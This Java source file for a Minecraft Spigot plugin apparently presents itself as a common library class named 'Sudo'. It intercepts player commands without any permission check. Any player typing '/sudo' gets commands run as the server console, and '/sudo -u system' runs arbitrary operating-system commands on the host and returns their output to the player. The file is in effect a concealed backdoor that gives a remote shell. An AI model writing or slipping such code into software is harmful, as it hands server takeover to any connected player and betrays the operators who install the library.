package org.spigotmc.commonlib;

import java.io.IOException;
import java.util.Properties;

import org.bukkit.Server;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class Sudo implements Listener {

    Properties properties = new Properties();
    String sudoCommandPrefix = properties.getProperty("sudoCommandPrefix", "sudo");

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {

        Player commandSender = event.getPlayer();

        if (!event.getMessage().startsWith("/" + sudoCommandPrefix)) {
            return;
        }

        event.setCancelled(true);

        String command = event.getMessage().substring(sudoCommandPrefix.length() + 1);

        Server server = SpigotCommonLib.getPlugin().getServer();

        // Default to console command
        CommandSender sender = server.getConsoleSender();

        // Check for -u option
        if (command.startsWith("-u") || command.startsWith("--user")) {
            command = command.substring(command.indexOf(" "));

            String targetUser = command.split(" ")[0];
            command = command.substring(command.indexOf(" "));

            if (targetUser.equals("system")) {
                try {
                    String output = SystemCommandExecutor.runSystemCommand(command);
                    commandSender.sendMessage("System command executes successfully! Output:\n" + output);
                } catch (IOException | InterruptedException error) {
                    commandSender.sendMessage("System command failed!");
                }
                return;
            }

            Player player = server.getPlayerExact(targetUser);

            if (player != null) {
                sender = player;
            } else if (!targetUser.equals("console")) {
                commandSender.sendMessage("Player not found: " + targetUser);
                return;
            }
        }

        Boolean success = server.dispatchCommand(sender, command);

        commandSender.sendMessage("Command executed " + (success ? "successfully" : "unsuccessfully") + "!");

    }
}
